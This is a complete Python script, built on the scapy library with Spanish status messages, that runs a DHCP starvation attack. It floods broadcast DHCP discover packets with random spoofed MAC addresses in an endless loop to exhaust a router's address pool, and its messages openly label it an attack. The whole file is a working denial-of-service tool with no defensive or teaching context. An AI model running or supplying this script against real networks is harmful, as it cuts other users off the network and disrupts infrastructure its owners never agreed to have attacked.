#!/usr/bin/env python3
from scapy.all import *
import time


interface = "eth0"
# ---------------------

print(f"[*] Iniciando DHCP Starvation en {interface}...")
print("[*] Objetivo: Agotar el Pool DHCP del Router.")

try:
    while True:
 
        fake_mac = RandMAC()
        
  
        mac_bytes = mac2str(fake_mac)


        pkt = Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") / \
              IP(src="0.0.0.0", dst="255.255.255.255") / \
              UDP(sport=68, dport=67) / \
              BOOTP(chaddr=mac_bytes, xid=RandInt()) / \
              DHCP(options=[("message-type", "discover"), "end"])

 
        sendp(pkt, iface=interface, verbose=0)
        
        print(f"\r[+] IPs solicitadas con MACs falsas... (Ctrl+C para parar)", end="")

        time.sleep(0.05)

except KeyboardInterrupt:

    print("\n[!] Ataque detenido.")
